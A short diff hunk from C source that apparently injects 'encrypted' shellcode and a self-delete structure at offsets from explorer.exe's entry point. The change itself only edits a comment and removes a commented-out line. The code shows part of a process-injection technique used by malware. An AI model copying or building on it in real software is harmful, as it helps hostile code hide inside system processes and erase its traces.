@@ -146,11 +146,10 @@ int main(int argc, char *argv[]) {
 	  // Get entry point of explorer.exe
 	  process_entry = GetProcessEntryPointAddress( pi.hProcess, pi.hThread );
 
-	  // Calculate entry point of "encrypted" shellcode
+	  // Calculate entry point of "encrypted" shellcode, 10 byte offset
 	  shell_entry = process_entry + 10;
 
 	  // Calculate location of selfdelete struct
-	  //data = process_entry + sizeof( shellcode );
 	  data = process_entry + 149;
 
 	  // Overwrite shellcode entry point in shellcode
